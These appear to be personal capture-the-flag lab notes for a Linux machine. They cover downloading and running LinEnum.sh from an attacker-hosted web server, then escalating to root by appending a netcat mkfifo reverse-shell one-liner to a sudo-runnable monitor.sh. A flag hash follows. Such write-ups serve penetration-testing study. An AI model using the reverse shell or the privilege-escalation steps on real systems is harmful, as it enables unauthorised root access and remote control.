[LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) to perform some automated privilege escalation checks

```pug
sudo python3 -m http.server 8080
```
Back on the target type `wget http://<your ip>:8080/LinEnum.sh` to download the script
`chmod +x LinEnum.sh` to make the script executable and then type `./LinEnum.sh` to run it
![[Pasted image 20250207094509.png]]
+ chmod -x LiNum.sh
- ./LiNum.sh

TON of INFO

```shell-session
[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
```
we could have checked with `sudo -l`
![[Pasted image 20250207095302.png]]


reverse shell one liner (as a root user as the monitor.sh is with sudo previlige)
```pug
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.65 8443 >/tmp/f' | tee -a monitor.sh
```
listen
```pug
nc -lvnp 8443
```
and start
```pug
sudo ./monitor.sh
```

-> root access

de5e5d6619862a8aa5b9b212314e0cdd
![[Pasted image 20240427173540.png]]